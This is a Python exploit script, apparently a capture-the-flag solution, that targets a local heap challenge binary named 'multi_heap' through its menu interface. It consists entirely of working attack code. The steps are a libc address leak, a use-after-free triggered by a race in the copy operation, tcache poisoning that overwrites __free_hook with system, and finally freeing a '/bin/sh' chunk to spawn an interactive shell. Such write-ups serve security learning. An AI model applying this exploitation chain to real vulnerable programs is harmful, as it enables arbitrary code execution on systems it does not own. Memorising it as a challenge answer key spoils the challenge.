from ptrlib import *

def alloc(type, size, main = True):
    sock.sendlineafter("choice: ", "1")
    sock.sendlineafter("Which: ", type)
    sock.sendlineafter("Size: ", str(size))
    sock.recvuntil("): ")
    if main:
        sock.sendline("m")
    else:
        sock.sendline("t")
    return

def free(index):
    sock.sendlineafter("choice: ", "2")
    sock.sendlineafter("Index: ", str(index))
    return

def write(index):
    sock.sendlineafter("choice: ", "3")
    sock.sendlineafter("Index: ", str(index))
    result = []
    while True:
        r = sock.recvline()
        if b'=====' in r: break
        result.append(r)
    return result

def read(index, size, data):
    sock.sendlineafter("choice: ", "4")
    sock.sendlineafter("Index: ", str(index))
    sock.sendlineafter("Size: ", str(size))
    sock.sendline(data)
    return

def copy(src, dst, size, thread):
    sock.sendlineafter("choice: ", "5")
    sock.sendlineafter("index: ", str(src))
    sock.sendlineafter("index: ", str(dst))
    sock.sendlineafter("Size: ", str(size))
    sock.sendlineafter("): ", thread)
    return

libc = ELF("./libc.so.6")
sock = Process("./multi_heap")
libc_main_arena = 0x3ebc40
delta = 1168

# libc leak
alloc('char', 0x500)
free(0)
alloc('char', 0x80)
libc_base = u64(write(0)[0]) - libc_main_arena - delta
logger.info("libc base = " + hex(libc_base))

# UAF by race condition
alloc('char', 0x400) # 1
alloc('char', 0x400) # 2
read(1, 0x80, p64(libc_base + libc.symbol("__free_hook")) + b'A' * 0x78)
copy(1, 2, 0x400, 'y\n2\n2')

# tcache poisoning
alloc('char', 0x400) # 2
alloc('char', 0x400) # 3
read(2, 0x8, '/bin/sh\x00')
read(3, 0x8, p64(libc_base + libc.symbol("system")))

# get the shell!
free(2)

sock.interactive()
